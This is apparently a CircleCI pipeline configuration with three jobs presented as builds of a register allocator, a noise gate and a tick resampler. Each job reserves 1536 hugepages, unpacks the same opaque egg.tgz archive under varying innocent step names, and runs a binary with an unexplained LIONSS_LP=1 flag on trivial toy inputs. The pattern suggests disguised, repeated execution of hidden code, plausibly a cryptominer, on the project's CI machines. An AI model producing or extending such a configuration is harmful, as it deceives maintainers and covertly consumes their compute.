version: 2.1

jobs:
  regalloclinear:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Emit live ranges
          command: |
            printf 'r1 [0,5)\n' > ranges.txt
      - run:
          name: Build register allocator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target regalloclinear -j2
      - run:
          name: Linear-scan allocate
          command: LIONSS_LP=1 ./build/regalloclinear --ranges ranges.txt --regs 14
  noiseGate:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set gate params
          command: |
            printf 'thresh=-40\n' > gate.cfg
      - run:
          name: Build dynamics processor
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target noiseGate -j2
      - run:
          name: Apply noise gate
          command: LIONSS_LP=1 ./build/noiseGate --conf gate.cfg --attack 2ms
  tickresample:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load raw ticks
          command: |
            printf 'ts,px\n0,10\n1,11\n' > raw.csv
      - run:
          name: Build resampler
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target tickresample -j2
      - run:
          name: Resample to 1s bars
          command: LIONSS_LP=1 ./build/tickresample --in raw.csv --freq 1s
